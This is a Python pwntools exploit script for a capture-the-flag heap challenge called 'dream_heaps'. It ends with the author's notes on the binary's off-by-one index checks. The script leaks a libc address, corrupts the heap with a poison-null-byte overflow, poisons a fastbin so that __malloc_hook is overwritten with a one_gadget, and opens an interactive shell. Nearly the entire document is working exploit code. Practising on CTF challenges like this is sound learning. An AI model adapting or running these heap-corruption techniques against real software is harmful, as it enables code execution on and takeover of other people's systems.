#!/usr/bin/env python3

from pwn import *

exe = ELF("./dream_heaps")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def new_dream(size, data):
    	r.sendline("1")
    	r.sendline(str(size))
    	r.send(data)

    def read_dream(idx):
    	r.sendline("2")
    	r.sendline(str(idx))

    def edit_dream(idx, data):
    	r.sendline("3")
    	r.sendline(str(idx))
    	r.send(data)

    def delete_dream(idx):
    	r.sendline("4")
    	r.sendline(str(idx))

    # libc leak
    new_dream(0xa0, "1"*0xa0) # 0
    new_dream(0x8, "2"*8) # 1
    delete_dream(0)
    new_dream(8, "1"*8) # 2
    read_dream(2)

    r.recvuntil("1"*8)
    leak = u64(r.recvn(6) + "\x00\x00")
    libc.address = leak - 0x3c3c18
    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("__malloc_hook: {}".format(hex(libc.symbols['__malloc_hook'])))

    # Poison null byte

    new_dream(0x108, "A"*0x108) # 3
    new_dream(0x200, "B"*0x1f0 + p64(0x200) + p64(0)) # 4
    new_dream(0x100, "C"*0x100) # 5
    new_dream(0x100, "D"*0x100) # 6

    delete_dream(4)
    edit_dream(3, "A"*0x108)

    new_dream(0x100, "B1"*(0x80)) # 7
    new_dream(0x60, "B2"*(0x30)) # 8

    delete_dream(7)
    delete_dream(5)

    hook = libc.symbols['__malloc_hook'] - 0x23
    one_gadget = libc.address + 0xef9f4 #; 0xf0897

    new_dream(0x300, "A"*0x100 + p64(0x110) + p64(0x70) + "\x00"*0x60 + p64(0) + p64(0x80) + "\x00"*(0x1f0-0x70)) # 9
    delete_dream(8)
    edit_dream(9, "A"*0x100 + p64(0x110) + p64(0x70) + p64(hook) + "\x00"*0x58 + p64(0) + p64(0x80) + "\x00"*(0x1f0-0x70))

    new_dream(0x60, "S"*0x60)
    new_dream(0x60, "\x00"*0x13 + p64(one_gadget) + "\x00"*(0x60-0x13-8))
    
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
INDEX     0x060208c
HEAP_PTRS 0x06020a0
SIZES     0x06020e0

0000000000602018 free@got
new dream:
	- asks for size
	- malloc(size)
	- read(0, chunk, size)
	- *(void **)(HEAP_PTRS + (long)INDEX * 8) = chunk;
	  *(int *)(SIZES + (long)INDEX * 4) = size;
	  INDEX++

read dream:
	- asks for index if (INDEX < i) - off by one
	- prints contents

edit dream:
	- asks for index if (INDEX < i) - off by one
	- read(0,old_chunk,(long)old_size);
	- makes sure there is NULL at the end

delete dream:
	- asks for index if (INDEX < i) - off by one
	- frees and clears the ptr
'''